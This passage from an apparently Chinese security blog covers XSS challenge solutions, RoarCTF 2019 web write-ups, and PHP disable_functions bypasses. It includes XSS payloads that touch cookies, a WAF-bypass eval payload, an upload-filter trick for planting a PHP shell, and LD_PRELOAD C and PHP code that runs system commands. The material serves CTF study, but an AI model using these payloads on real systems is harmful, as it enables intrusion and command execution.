class="comment" title="'</span> + title.slice(<span class="number">0</span>, <span class="number">15</span>) + <span class="string">'" data-comment=\'&#123;"id":'</span> + index + <span class="string">'&#125;\'&gt;&lt;/p&gt;'</span>;</span><br><span class="line">    &#125;).join(<span class="string">'\n'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>svg xss 学到了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;svg&gt;&lt;!--#--&gt;&lt;script&gt;&lt;!--#--&gt;prompt(1&lt;!--#--&gt;)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p>由于这里用的是Html的注释，所以必须加个svg标签</p>
<p>svg配合实体编码bypass也是很常用的操作</p>
<h3 id="一些常用的Payload"><a href="#一些常用的Payload" class="headerlink" title="一些常用的Payload"></a>一些常用的Payload</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;p onfocus&#x3D;&quot;alert(document.cookie)&quot; id&#x3D;&quot;1&quot; tabindex&#x3D;&quot;0&quot;&gt;&lt;&#x2F;p&gt;</span><br><span class="line"></span><br><span class="line">&lt;input onfocus&#x3D;javascript:alert(1) autofocus&gt; </span><br><span class="line"></span><br><span class="line">&lt;input onblur&#x3D;javascript:alert(1) autofocus&gt;&lt;input autofocus&gt;</span><br><span class="line"></span><br><span class="line">&lt;textarea onfocus&#x3D;javascript:alert(1) autofocus&gt;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://www.hackersb.cn/hacker/85.html" target="_blank" rel="noopener">https://www.hackersb.cn/hacker/85.html</a></p>
<p><a href="https://xz.aliyun.com/t/4507#toc-4" target="_blank" rel="noopener">https://xz.aliyun.com/t/4507#toc-4</a></p>
<p><a href="https://wooyun.js.org/drops/xss挑战赛writeup.html" target="_blank" rel="noopener">https://wooyun.js.org/drops/xss%E6%8C%91%E6%88%98%E8%B5%9Bwriteup.html</a></p>
<p><a href="http://momomoxiaoxi.com/2017/10/10/XSS/" target="_blank" rel="noopener">http://momomoxiaoxi.com/2017/10/10/XSS/</a></p>

      
    </div>
    <footer class="article-footer">
      
        <a data-url="http://yoursite.com/2019/10/20/prompt-1-to-win/" data-id="ckabsu38z0030kkvr0g5l9qbm" class="article-share-link" data-share="baidu" data-title="prompt(1) to win">Share</a>
      

      
        <a href="http://yoursite.com/2019/10/20/prompt-1-to-win/#ds-thread" class="article-comment-link">Comments</a>
      

      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/xss/" rel="tag">xss</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-Roarctf2019" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/10/20/Roarctf2019/" class="article-date">
  <time datetime="2019-10-20T12:21:06.000Z" itemprop="datePublished">2019-10-20</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/10/20/Roarctf2019/">Roarctf2019</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="easy-calc"><a href="#easy-calc" class="headerlink" title="easy_calc"></a>easy_calc</h3><p>这题后面的代码bypass挺简单的，也就是这个</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'num'</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $str = $_GET[<span class="string">'num'</span>];</span><br><span class="line">        $blacklist = [<span class="string">' '</span>, <span class="string">'\t'</span>, <span class="string">'\r'</span>, <span class="string">'\n'</span>,<span class="string">'\''</span>, <span class="string">'"'</span>, <span class="string">'`'</span>, <span class="string">'\['</span>, <span class="string">'\]'</span>,<span class="string">'\$'</span>,<span class="string">'\\'</span>,<span class="string">'\^'</span>];</span><br><span class="line">        <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">'/'</span> . $blackitem . <span class="string">'/m'</span>, $str)) &#123;</span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">"what are you want to do?"</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">'echo '</span>.$str.<span class="string">';'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>主要是jQuery先是传给了waf，waf遇到字符就403</p>
<p><img src="https://s2.ax1x.com/2019/10/14/KpdvNR.png" alt="KpdvNR.png"></p>
<p>这里可以看到是采用?num传给waf的，所以?%20num就可以Bypass掉waf了，直接传给calc.php正常执行了。</p>
<p>payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">%20num&#x3D;1;var_dump(readfile(hex2bin(base_convert(52115961636711,10,16))))</span><br><span class="line">&#x2F;&#x2F;更简单的一点的payload</span><br><span class="line">%20num&#x3D;1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</span><br></pre></td></tr></table></figure>

<p>不过这道题我重点想说了还是E99这位师傅payload，太硬核了，膜。</p>
<p>通过1/0得到INF以及0/0拿到NAN去构造payload,并且通过位运算拿到新的字符</p>
<p>Fuzz的脚本</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$char = <span class="string">'1234567890-INFAH@+*%$()"!%meogiakcfhvwbnq_'</span>;</span><br><span class="line"><span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; strlen($char); $i++)&#123;</span><br><span class="line">    <span class="keyword">for</span>($j = <span class="number">0</span>; $j &lt; strlen($char); $j++)&#123;</span><br><span class="line">        <span class="keyword">echo</span>($char[$i] .<span class="string">'&amp;'</span> .$char[$j] . <span class="string">' '</span>. ($char[$i] &amp; $char[$j]));</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">"&lt;br&gt;"</span>);</span><br><span class="line">        <span class="keyword">echo</span>($char[$i] .<span class="string">'|'</span> .$char[$j] . <span class="string">' '</span>. ($char[$i] | $char[$j]));</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">"&lt;br&gt;"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>按这个意思，构造了一个phpinfo()来学习了一波</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> (((((<span class="number">2</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;|((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">2</span>&#125;)&amp;(((<span class="number">0</span>/<span class="number">0</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;|(<span class="number">0</span>).(<span class="number">0</span>)&#123;<span class="number">1</span>&#125;)).((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">0</span>)&#123;<span class="number">0</span>&#125;&amp;((<span class="number">0</span>/<span class="number">0</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;).((((<span class="number">2</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;|((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">2</span>&#125;)&amp;(((<span class="number">0</span>/<span class="number">0</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;|(<span class="number">0</span>).(<span class="number">0</span>)&#123;<span class="number">1</span>&#125;)).(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;).(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;).(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">0</span>))&#123;<span class="number">2</span>&#125;).(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;|((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;))();</span><br></pre></td></tr></table></figure>

<p>最后要构造的payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(serIALIze)(FILe(&#x2F;f1agg))</span><br></pre></td></tr></table></figure>

<p>这要字符比较少，好构造一些</p>
<h3 id="simple-upload"><a href="#simple-upload" class="headerlink" title="simple_upload"></a>simple_upload</h3><p>这题做的有点难受….，直接把我卡死了…后面的题也没怎么做了…</p>
<p>题目源码如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Home</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $uploadFile = $_FILES[<span class="string">'file'</span>] ;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (strstr(strtolower($uploadFile[<span class="string">'name'</span>]), <span class="string">".php"</span>) ) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        $upload = <span class="keyword">new</span> \Think\Upload();<span class="comment">// 实例化上传类</span></span><br><span class="line">        $upload-&gt;maxSize  = <span class="number">4096</span> ;<span class="comment">// 设置附件上传大小</span></span><br><span class="line">        $upload-&gt;allowExts  = <span class="keyword">array</span>(<span class="string">'jpg'</span>, <span class="string">'gif'</span>, <span class="string">'png'</span>, <span class="string">'jpeg'</span>);<span class="comment">// 设置附件上传类型</span></span><br><span class="line">        $upload-&gt;rootPath = <span class="string">'./Public/Uploads/'</span>;<span class="comment">// 设置附件上传目录</span></span><br><span class="line">        $upload-&gt;savePath = <span class="string">''</span>;<span class="comment">// 设置附件上传子目录</span></span><br><span class="line">        $info = $upload-&gt;upload() ;</span><br><span class="line">        <span class="keyword">if</span>(!$info) &#123;<span class="comment">// 上传错误提示错误信息</span></span><br><span class="line">          <span class="keyword">$this</span>-&gt;error($upload-&gt;getError());</span><br><span class="line">          <span class="keyword">return</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;<span class="comment">// 上传成功 获取上传文件信息</span></span><br><span class="line">          $url = __ROOT__.substr($upload-&gt;rootPath,<span class="number">1</span>).$info[<span class="string">'file'</span>][<span class="string">'savepath'</span>].$info[<span class="string">'file'</span>][<span class="string">'savename'</span>] ;</span><br><span class="line">          <span class="keyword">echo</span> json_encode(<span class="keyword">array</span>(<span class="string">"url"</span>=&gt;$url,<span class="string">"success"</span>=&gt;<span class="number">1</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里写了一个upload方法，先是在通过strstr对.php字符串进行了过滤，然后调用Upload类通过tp的上传方法进行文件上传。</p>
<p>首先看了一下基本的上传bypass操作，没什么用，前面加了个前缀，htaccess和.user.ini肯定不好使，pht之类的又不解析，硬上传php的话肯定是需要.php的，但是这个又给ban了，尝试了很久之后，想了一下，硬上传php是肯定不可能的了。</p>
<p>接着想到了phar反序列化..因为感觉有getimagesize</p>
<p>PHP: 不好意思，确实有，但是咱处理的是tmpfile</p>
<p>…</p>
<p>这个坑点我在bytectf就想过…肯定处理的是tmpfile啊…(真想给自己一拳</p>
<p>接着就往Upload类源码上靠了，打了个断点，想跟进去看看，比赛结束前天晚上没好使…结束倒是突然好使了,真是难受，当是看看源码的话说不定就有突破了</p>
<p>最后一张图片解释一下吧</p>
<p>这里我们可以在upload处打一个断点，传一个图片跟进去看看，很清楚的可以看到这里用strip_tags去处理了文件名，所以后缀为<code>p&lt;br&gt;hp</code>就可以绕过了。</p>
<p><img src="https://s2.ax1x.com/2019/10/14/KpdPTs.png" alt="KpdPTs.png"></p>
<p>成功上传shell…,我太难了</p>
<p><img src="https://s2.ax1x.com/2019/10/14/KpdmXF.png" alt="KpdmXF.png"></p>
<p>之后看其他师傅的wp了解了有第二种做法…有点懵..上传两个文件，比赛的时候试过…很迷没成功…….</p>
<p><img src="https://s2.ax1x.com/2019/10/18/KZUHdx.png" alt="KZUHdx.png"></p>
<p>也成功上传了..两个文件？…我被演了吗…</p>
<p>接下来就是爆破文件名了，在爆破文件名的时候其实有一个小技巧</p>
<p>比如两个文件名</p>
<p>5da9614614f1a.php</p>
<p>5da9614617439.png</p>
<p>将后四位转化为10进制，其实相差只有不到10000,所以很快就爆破出来了，爆破脚本就不贴了。</p>
<p>通过这道题规避了这个坑点，上传的时候，getimagesize之类的函数肯定去判断的tmpfile，所以一定不存在phar反序列化</p>
<h3 id="Easy-java"><a href="#Easy-java" class="headerlink" title="Easy_java"></a>Easy_java</h3><p>没怎么看过java以及javaweb…看了wp感觉不是很难…真是可惜了….，其实主要就是弱口令吧…</p>
<p>通过弱口令admin/admin888进入，通过download进行下载，不过是post类型的</p>
<p><img src="https://s2.ax1x.com/2019/10/18/KemQl8.png" alt="KemQl8.png"></p>
<p>读一下flag控制器</p>
<p><img src="https://s2.ax1x.com/2019/10/18/KembtI.png" alt="KembtI.png"></p>
<h3 id="Online-proxy"><a href="#Online-proxy" class="headerlink" title="Online-proxy"></a>Online-proxy</h3><p>这道题….一时语塞.jpg</p>
<p>竟然就是一个常规的xff注入….？？？，通过上一次的xff注就行了</p>
<h3 id="dist"><a href="#dist" class="headerlink" title="dist"></a>dist</h3><p>不好意思，比赛的时候发现泄露的源码是go就没看了，不会Go…(还有好多要学啊orz….</p>
<p>说说前面的泄露部分的吧.</p>
<p>前端源码有sourceMapping,看一下config.js</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> ip = window.location.host.split(<span class="string">':'</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">var</span> auth = <span class="string">'http://'</span>+ip+<span class="string">':9000/auth'</span>;</span><br><span class="line"><span class="keyword">var</span> api = <span class="string">'http://'</span>+ip+<span class="string">':5001/api'</span>;</span><br><span class="line">export &#123; auth, api &#125;;</span><br><span class="line"><span class="comment">// my source code backup:</span></span><br><span class="line"><span class="comment">// /backup-for-debug.7z</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// WEBPACK FOOTER //</span></span><br><span class="line"><span class="comment">// ./src/config.js</span></span><br></pre></td></tr></table></figure>

<p>可以看到后端的代码在backup-for-debug.7z，下载下来开始审计。</p>
<p>…</p>
<h3 id="phpshe"><a href="#phpshe" class="headerlink" title="phpshe"></a>phpshe</h3><p>待看</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><strong>准备学习Go和Java！！！！！！！！！！！！！</strong></p>

      
    </div>
    <footer class="article-footer">
      
        <a data-url="http://yoursite.com/2019/10/20/Roarctf2019/" data-id="ckabsu38h001ukkvreek4eu7h" class="article-share-link" data-share="baidu" data-title="Roarctf2019">Share</a>
      

      
        <a href="http://yoursite.com/2019/10/20/Roarctf2019/#ds-thread" class="article-comment-link">Comments</a>
      

      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-Bypass-disabled-functions-open-basedir-php" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/10/09/Bypass-disabled-functions-open-basedir-php/" class="article-date">
  <time datetime="2019-10-09T10:19:15.000Z" itemprop="datePublished">2019-10-09</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/10/09/Bypass-disabled-functions-open-basedir-php/">Bypass disabled_functions &amp; open_basedir-php</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>很多情况下我们会遇到拿到webshell，却无法拿到我们想要数据的情况，被服务器所设置的open_basedir和disabled_functions所限制，下面写的就是一些bypass方法了。</p>
<h3 id="bypass-disabled-functions"><a href="#bypass-disabled-functions" class="headerlink" title="bypass disabled_functions"></a>bypass disabled_functions</h3><h4 id="寻找遗漏危险函数"><a href="#寻找遗漏危险函数" class="headerlink" title="寻找遗漏危险函数"></a>寻找遗漏危险函数</h4><p>一般被遗漏的危险函数都是如popen,proc_open(),pcntl_exec()这样的函数，比如在国决Day1的web11</p>
<p><a href="https://github.com/imagemlt/CISCN_2019_final_pmarkdown" target="_blank" rel="noopener">https://github.com/imagemlt/CISCN_2019_final_pmarkdown</a></p>
<p>在disabled_functions就存在未过滤popen的情况，这样最后就可以不用去引入恶意so了</p>
<p>下面是当时disabled_functions的内容</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,mail,passthru,exec,system,chroot,chgrp,chown,shell_exec,proc_open,proc_get_status,ini_alter,ini_alter,ini_restore,dl,pfsockopen,openlog,syslog,readlink,symlink,popepassthru,stream_socket_server,fsocket,fsockopen</span><br></pre></td></tr></table></figure>

<h4 id="利用LD-PRELOAD"><a href="#利用LD-PRELOAD" class="headerlink" title="利用LD_PRELOAD"></a>利用LD_PRELOAD</h4><h5 id="LD-PRELOAD"><a href="#LD-PRELOAD" class="headerlink" title="LD_PRELOAD"></a>LD_PRELOAD</h5><blockquote>
<p>在UNIX的动态链接库的世界中，LD_PRELOAD就是这样一个环境变量，它可以影响程序的运行时的链接（Runtime linker），它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。一方面，我们可以以此功能来使用自己的或是更好的函数（无需别人的源码），而另一方面，我们也可以以向别人的程序注入恶意程序，从而达到那不可告人的罪恶的目的。</p>
</blockquote>
<p>从上面可以看出本来LD_PRELOAD的作用是利用我们加载进来的so，去覆盖相同函数名的库函数，去使用自己的函数，更加方便，但是如果自己的函数为恶意函数，就造成了恶意程序注入。</p>
<h5 id="动态链接与静态链接"><a href="#动态链接与静态链接" class="headerlink" title="动态链接与静态链接"></a>动态链接与静态链接</h5><blockquote>
<p>一般来说，程序的链接分为静态链接和动态链接，静态链接就是把所有所引用到的函数或变量全部地编译到可执行文件中。动态链接则不会把函数编译到可执行文件中，而是在程序运行时动态地载入函数库，也就是运行链接。所以，对于动态链接来说，必然需要一个动态链接库。动态链接库的好处在于，一旦动态库中的函数发生变化，对于可执行程序来说是透明的，可执行程序无需重新编译。这对于程序的发布、维护、更新起到了积极的作用。对于静态链接的程序来说，函数库中一个小小的改动需要整个程序的重新编译、发布，对于程序的维护产生了比较大的工作量。</p>
<p>有得就有失。动态链接所带来的坏处和其好处一样同样是巨大的。因为程序在运行时动态加载函数，这也就为他人创造了可以影响你的主程序的机会。试想，一旦，你的程序动态载入的函数不是你自己写的，而是载入了别人的有企图的代码，通过函数的返回值来控制你的程序的执行流程，那么，你的程序也就被人“劫持”了。</p>
</blockquote>
<p>可以看出虽然动态链接增添了很多方便，但同时也增加了不少风险度，比如我们可以引入自己的so文件，里面写好我们想要的执行内容的库函数，这样就会导致覆盖了原来正常的库函数，造成函数劫持</p>
<p>对LD_PRELOAD的利用大概可分为两种，第一种是劫持库函数，第二种是劫持启动进程</p>
<h5 id="劫持库函数"><a href="#劫持库函数" class="headerlink" title="劫持库函数"></a>劫持库函数</h5><p>网上大多数都是劫持的getuid，其实能劫持的并不只getuid,我们需要劫持的函数需要满足，此函数为点：<strong>经常被用到的并且为无参数的函数</strong></p>
<p>比如getuid,getpid,getgid,getppid这种，具体的可以fuzz一下，应该蛮多的</p>
<p>具体操作过程(以geteuid的劫持为例)</p>
<p>hack.c</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">payload</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        system(<span class="string">"whoami &gt; hack"</span>);</span><br><span class="line">&#125;   </span><br><span class="line"><span class="function"><span class="keyword">int</span>  <span class="title">geteuid</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (getenv(<span class="string">"LD_PRELOAD"</span>) == <span class="literal">NULL</span>) &#123; <span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br><span class="line">unsetenv(<span class="string">"LD_PRELOAD"</span>);</span><br><span class="line">payload();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译成so文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -c -fPIC hack.c -o hack</span><br><span class="line">gcc --share hack -o hack.so</span><br></pre></td></tr></table></figure>

<p>写一个hack.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">putenv(<span class="string">"LD_PRELOAD=./hack.so"</span>);</span><br><span class="line">mail(<span class="string">""</span>,<span class="string">""</span>,<span class="string">""</span>,<span class="string">""</span>,<span class="string">""</span>);<span class="comment">//error_log('',1);</span></span><br><span class="line"><span class="comment">//imap_mail('a@a',1,1,1,1);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里能调用的函数不止有mail，在mail函数被ban掉的情况下也可以用error_log，imap_mail等，需要注意的是error_log的第二个参数需要设置为1表示发送邮件会调用sendmail进程，imap_mail也可调用sendmail进程，即可调用sendmail子进程，下面放一下对比图，就不演示具体的过程了</p>
<p><img src="https://s2.ax1x.com/2019/10/03/uwQjHJ.png" alt="uwQjHJ.png"></p>
<p>可以看到这里都调用了sendmail进程。</p>
<h5 id="劫持启动进程"><a href="#劫持启动进程" class="headerlink" title="劫持启动进程"></a>劫持启动进程</h5><p>从上面来看，劫持库函数需要找到特定的库函数去劫持，那么劫持新进程是不需要找到特定的库函数的。</p>
<blockquote>
<p>GCC 有个 C 语言扩展修饰符 <code>__attribute__((constructor))</code>，可以让由它修饰的函数在 main() 之前执行，若它出现在共享对象中时，那么一旦共享对象被系统加载，立即将执行 <code>__attribute__((constructor))</code> 修饰的函数。</p>
</blockquote>
<p>__attribute__((constructor))更加直接的去讲：有这个说明：</p>
<p><strong>它是在加载共享库时运行的，通常是在程序启动过程中</strong>，也就是当有一个新进程/子进程启动时，那么__attribute__((constructor))就会被直接加载，我们上面的mail等函数也正好符合这个特性，下面也接着来试一下</p>
<p>hack.c</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">__attribute__ ((__constructor__)) <span class="function"><span class="keyword">void</span> <span class="title">angel</span> <span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    unsetenv(<span class="string">"LD_PRELOAD"</span>);</span><br><span class="line">    system(<span class="string">"ls"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>hack.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">putenv(<span class="string">"LD_PRELOAD=./hack.so"</span>);</span><br><span class="line">error_log(<span class="string">''</span>,<span class="number">1</span>);</span><br></pre></td></tr></table></figure>

<p>运行，即可列目录</p>
<p>具有这种开一个新进程/子进程的函数还有其他的，比如imagick同样可以</p>
<p>test.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$img = <span class="keyword">new</span> Imagick(<span class="string">'test.wmv'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>新建一个test.wmv</p>
<p>看一下调用的新进程</p>
<p><img src="https://s2.ax1x.com/2019/10/04/uB7xot.png" alt="uB7xot.png"></p>
<p>从上面可以看出这里取调用了新进程ffmpeg进行处理</p>
<p>调用ffmpeg的还有以下几种后缀</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmv,mov,m4v,m2v,mp4,mpg,mpeg,mkv,avi,3g2,3gp</span><br></pre></td></tr></table></figure>

<p>引入恶意so进行一下实验</p>
